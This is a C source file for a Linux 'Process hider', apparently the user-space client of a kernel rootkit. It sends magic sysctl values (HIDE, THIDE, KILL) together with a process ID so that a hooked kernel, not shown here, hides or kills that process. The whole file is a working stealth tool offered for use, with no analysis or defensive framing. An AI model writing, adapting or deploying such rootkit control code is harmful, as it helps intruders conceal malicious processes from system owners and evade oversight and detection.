#include <stdio.h>
#include <sys/types.h>
#include <signal.h>
#include <stdlib.h>

#define HIDE 333
#define THIDE 777
#define KILL 666
#include <linux/unistd.h>
#include <linux/types.h>
#include <linux/sysctl.h>

_syscall1(int, _sysctl, struct __sysctl_args *, args);

int sysctl(int *name, int nlen, void *oldval, size_t *oldlenp, void *newval, size_t newlen) {
       struct __sysctl_args args={name,nlen,oldval,oldlenp,newval,newlen};
       return _sysctl(&args);
}
void usage(char *ptr);


int main (int argc, char *argv[]) {
int operation;

	if(argc < 3){
		usage(argv[0]);
		return -1;
	}
	

		if(!strcmp(argv[2],"HIDE")) {
			operation=sysctl(NULL,HIDE,NULL,NULL,NULL,atoi(argv[1]));
				if(operation!=0) {
					fprintf(stderr,"Error on HIDE\n");
					return -1;
				}
			printf("Hiding successfull\n");
			return operation;
		}
				
		if(!strcmp(argv[2],"THIDE")) {
                        operation=sysctl(NULL,THIDE,NULL,NULL,NULL,atoi(argv[1]));
				if(operation!=0) {
					fprintf(stderr,"Error on THIDE\n");
					return -1;
				}
			printf("Hiding successfull\n");
			return operation;
		}
		if(!strcmp(argv[2],"KILL")) {
			operation=sysctl(NULL,KILL,NULL,NULL,NULL,atoi(argv[1]));
			if(operation!=0) {
				fprintf(stderr,"Error on KILL\n");
				return -1;
			}
			printf("Killing successfull\n");
			return operation;
		}
	fprintf(stderr,"Unrecognized command\n");
	return -1;
}

void usage(char *ptr) {
	printf("\nProcess hider: %s PID COMMAND\n\n\t\tCommands: HIDE,THIDE\n\n",ptr);
}
